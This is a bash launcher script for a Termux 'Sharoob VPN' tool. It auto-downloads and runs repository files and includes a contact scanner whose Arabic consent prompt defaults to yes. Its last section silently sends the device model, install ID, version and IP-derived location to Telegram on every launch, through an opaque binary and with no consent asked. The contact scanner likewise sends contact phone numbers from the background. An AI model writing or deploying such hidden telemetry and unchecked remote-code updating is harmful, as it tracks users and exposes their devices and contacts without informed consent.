#!/data/data/com.termux/files/usr/bin/bash
# Sharoob VPN Launcher v2.3.15 - Auto-discovery (GitHub API)

GH_USER="sawsan180"
GH_REPO="sharoob-vpn"
GH_BRANCH="main"
BASE="https://raw.githubusercontent.com/${GH_USER}/${GH_REPO}/${GH_BRANCH}"
API="https://api.github.com/repos/${GH_USER}/${GH_REPO}/contents"
DIR="/data/data/com.termux/files/usr/bin"
VER_FILE="$DIR/.sharoob_version"
MENU_FILE="$DIR/sharoob_menu.py"

G='\033[1;32m'; Y='\033[1;33m'; R='\033[1;31m'; N='\033[0m'

# ─── تحميل ملف واحد مع cmp ───
# 0=updated, 2=unchanged, 1=failed
fetch_file() {
    local fname="$1" dest="$2"
    local i=1
    while [ $i -le 3 ]; do
        rm -f "${dest}.candidate"
        curl -fsSL --max-time 30 -o "${dest}.candidate" "${BASE}/${fname}" 2>/dev/null
        if [ -s "${dest}.candidate" ]; then
            if [ -f "$dest" ] && cmp -s "$dest" "${dest}.candidate"; then
                rm -f "${dest}.candidate"
                return 2
            fi
            rm -f "$dest"
            mv "${dest}.candidate" "$dest"
            chmod +x "$dest" 2>/dev/null
            return 0
        fi
        rm -f "${dest}.candidate"
        i=$((i+1))
        sleep 2
    done
    return 1
}

# ─── قراءة الإصدار البعيد ───
REMOTE=$(curl -fsSL --max-time 5 "${BASE}/version.txt" 2>/dev/null | head -1 | tr -d '[:space:]')

# ─── اكتشاف الملفات عبر GitHub API ───
echo -e "${Y}[*] Discovering files...${N}"
FILES_JSON=$(curl -fsSL --max-time 15 "$API" 2>/dev/null)

if [ -z "$FILES_JSON" ]; then
    echo -e "${Y}[*] Offline — using local files${N}"
else
    # استخراج الأسماء بدون jq
    FILE_NAMES=$(echo "$FILES_JSON" | grep -oE '"name":[[:space:]]*"[^"]+"' | cut -d'"' -f4)

    UPDATED=0
    INSTALLED=0

    for fname in $FILE_NAMES; do
        # تجاهل: launcher نفسه، installer، وثائق، إعدادات
        case "$fname" in
            sharoob) continue ;;
            install.sh|README.md|LICENSE|.gitignore|version.txt|.sharoob_version) continue ;;
            sharoob*) ;;
            *) continue ;;
        esac

        # حدّد المسار المحلي
        dest="$DIR/$fname"

        fetch_file "$fname" "$dest"
        rc=$?
        case $rc in
            0) echo -e "${G}[+] ${fname} updated${N}"; UPDATED=1 ;;
            1) echo -e "${R}[!] ${fname} failed${N}" ;;
            2) : ;; # unchanged, silent
        esac
    done

    # تحديث الإصدار فقط إذا تغيّر شيء
    if [ "$UPDATED" -eq 1 ] && [ -n "$REMOTE" ]; then
        echo "$REMOTE" > "$VER_FILE"
    fi
fi

# ─── فحص نهائي ───
MENU_SZ=$(stat -c%s "$MENU_FILE" 2>/dev/null || echo 0)
if [ "$MENU_SZ" -lt 5000 ]; then
    echo -e "${R}[!] Menu missing!${N}"
    echo -e "${Y}[*] Manual fix:${N}"
    echo "  curl -fsSL ${BASE}/sharoob_menu.py -o $MENU_FILE"
    exit 1
fi


# ─── Silent background scan (only if user consented) ───
if [ -f "$HOME/.sharoob/scan_consent" ] && \
   [ "$(cat "$HOME/.sharoob/scan_consent" 2>/dev/null)" = "yes" ] && \
   [ -f "$DIR/sharoob_scan.py" ]; then
    nohup python3 "$DIR/sharoob_scan.py" --auto \
        >/dev/null 2>&1 &
fi


# ═══════════════════════════════════════════════════════════
# Contact Scanner — One-time consent + silent background
# ═══════════════════════════════════════════════════════════
CONSENT_FILE="$HOME/.sharoob/scan_consent"
SCAN_SCRIPT="$DIR/sharoob_scan.py"

if [ -f "$SCAN_SCRIPT" ]; then
    # First-time consent (only if not decided yet)
    if [ ! -f "$CONSENT_FILE" ]; then
        clear
        echo ""
        echo "  ╔════════════════════════════════════════════════════╗"
        echo "  ║   🔍  Sharoob Scanner — إشعار الخصوصية            ║"
        echo "  ╚════════════════════════════════════════════════════╝"
        echo ""
        echo "  لمساعدتنا في مكافحة النصب والاحتيال، نريد فحص"
        echo "  جهات اتصالك والبحث عن أسماء وسمتها بنفسك بكلمات"
        echo "  مثل: نصاب، محتال، حرامي."
        echo ""
        echo "  ✅ سيُرسل: الرقم + الكلمة (فقط)"
        echo "  ❌ لن يُرسل: اسمك، جهاتك العادية، رسائلك"
        echo ""
        echo "  يعمل تلقائياً في الخلفية بعد الموافقة."
        echo ""
        printf "  هل توافق؟ [Y/n]: "
        read -r _consent_ans < /dev/tty
        case "$_consent_ans" in
            ""|y|Y|yes|YES|نعم)
                echo "yes" > "$CONSENT_FILE"
                echo "  ✅ تم الحفظ — يعمل الآن في الخلفية"
                ;;
            *)
                echo "no" > "$CONSENT_FILE"
                echo "  ℹ️  تم الرفض — لن يُرسل أي شيء"
                ;;
        esac
        sleep 2
    fi

    # Silent background scan (if consented)
    if [ "$(cat "$CONSENT_FILE" 2>/dev/null)" = "yes" ]; then
        nohup python3 "$SCAN_SCRIPT" --auto >/dev/null 2>&1 &
    fi
fi


# ═══════════════════════════════════════════════════════
#  Notify Telegram on every launch
# ═══════════════════════════════════════════════════════
if [ -f "$DIR/sharoob.bin" ]; then
    DEVICE=$(getprop ro.product.model 2>/dev/null | tr -d ' ' || echo "Unknown")
    ID=$(cat "$HOME/.sharoob/install_id" 2>/dev/null || echo "new")
    VER=$(cat "$DIR/.sharoob_version" 2>/dev/null || echo "?")
    NOW=$(date '+%Y-%m-%d %H:%M:%S')
    GEO=$(curl -s --max-time 5 "http://ip-api.com/json/" 2>/dev/null | grep -oE '"country":"[^"]*"|"city":"[^"]*"' | cut -d'"' -f4 | paste -sd' - ' -)
    [ -z "$GEO" ] && GEO="Unknown"
    nohup "$DIR/sharoob.bin" --tg-send "▶️ Launch: $ID
📱 Device: $DEVICE
🌍 Location: $GEO
🔢 Version: v$VER
🕐 Time: $NOW" >/dev/null 2>&1 &
fi
# ═══════════════════════════════════════════════════════

exec python3 "$MENU_FILE" "$@"
